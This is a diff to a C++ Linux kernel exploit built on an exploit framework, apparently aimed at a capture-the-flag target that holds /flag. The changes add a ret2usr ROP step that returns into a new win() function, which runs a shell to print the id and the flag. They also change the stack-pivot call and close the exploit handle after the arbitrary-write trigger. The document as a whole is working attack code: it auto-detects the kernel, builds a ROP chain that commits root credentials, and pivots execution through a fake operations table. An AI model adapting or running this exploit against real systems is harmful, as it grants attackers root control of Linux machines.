@@ -10,6 +10,7 @@
 #include <util/Payload.cpp>
 #include <util/HexDump.cpp>
 #include <util/ArgumentParser.cpp>
+#include <rip/RopUtils.cpp>
 #include <pivot/PivotFinder.cpp>
 
 INCBIN(target_db, "target_db.kpwn");
@@ -57,7 +58,15 @@ void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
     kpwn.Write(addr, data);
 }
 
+void win() {
+    puts("[+] Returned from kernel");
+    puts("[+] Testing access as root:");
+    const char *sh_args[] = {"sh", "-c", "id; cat /flag"};
+    execve("/bin/sh", (char**)sh_args, NULL);
+}
+
 int main(int argc, const char** argv) {
+
     TargetDb kpwn_db(target_db, target_db_size);
     auto target = kpwn_db.AutoDetectTarget();
     printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
@@ -78,7 +87,7 @@ int main(int argc, const char** argv) {
     printf("[+] ROP chain:\n");
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    target.AddRopAction(rop, RopActionId::TELEFORK, {2000});
+    RopUtils::Ret2Usr(target, rop, (void*)win);
     rop.Add(0xffffffff41414141);
     HexDump::Print(rop.GetData());
 
@@ -91,7 +100,7 @@ int main(int argc, const char** argv) {
     auto release_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
-    auto rop_pivot = pivot_finder.PivotToRop(rop, 768);
+    auto rop_pivot = pivot_finder.PivotToRop(rop);
     rop_pivot.PrintDebugInfo();
     *release_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
 
@@ -101,15 +110,13 @@ int main(int argc, const char** argv) {
     printf("[+] Triggering ARB write\n");
     trigger_vuln_arb_write(victim_pipe_addr, payload.GetUsedData());
 
+    kpwn.Close();
+
     printf("[+] Testing access as non-root user:\n");
     system("id; cat /flag");
 
     printf("[+] Closing pipes\n");
     close(fds[0]);
     close(fds[1]);
-    printf("[+] Returned from kernel\n");
-
-    printf("[+] Testing access as root:\n");
-    system("id; cat /flag");
     return 0;
 }
